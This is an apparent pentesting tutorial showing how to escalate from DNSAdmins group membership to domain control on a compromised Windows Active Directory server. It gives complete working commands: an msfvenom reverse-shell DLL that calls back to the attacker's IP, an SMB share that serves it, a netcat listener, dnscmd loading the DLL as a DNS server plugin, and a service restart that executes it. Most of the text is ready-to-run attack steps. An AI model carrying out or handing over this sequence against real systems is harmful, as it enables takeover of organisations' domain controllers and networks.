# Windows Privilege Escalation: DNSAdmins to Domain Admins - Server Level DLL Injection

Say you have compromised a Windows machine that provides Active Directory Directory Services to its users and have gained access as a user who is a part of the DNSAdmins group, you can use this method to privilege escalate.

Here, what we're doing is:

1. Making a dll payload that sends a reverse shell back to our machine with msfvenom.
2. Serving it using SMB Server to make it available to the Windows machine. (You can use any other way to transfer it to the remote machine, but be careful, it might get nuked by the Anti-Virus.) And, we will also setup a netcat listener to catch our reverse shell.
3. Importing that dll in the DNS Server.
4. Restarting the DNS Server so that it loads the dll file.

Checking if your user is a part of the DNSAdmins group:

```powershell
whoami /all
```

Now, on to the fun part:

#making the payload

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.211.55.13 LPORT=4444 --platform=windows -f dll > ~/windows/privesc/plugin.dll
```

Here, because the Windows machine is of 64 bit achitechture, we're using x64 payload.

#serving the file using SMB Server using smbserver.py, that comes with Python3-Impacket.

```powershell
cd /usr/share/doc/python3-impacket/examples
./smbserver.py SHARE ~/windows/privesc/
```

In another terminal tab, set up a netcat listener to catch the reverse shell:

```powershell
nc -nvlp 4444
```

## Now, in the compromised Windows machine

##### Importing the plugin:

```powershell
dnscmd.exe myserver.local /config /serverlevelplugindll \\10.211.55.13\share\plugin.dll
```

##### Restarting the service:

```powershell
sc.exe stop dns
sc.exe start dns
```

Now, go back and check the netcat listener, you should have a reverse shell.

You're Welcome!

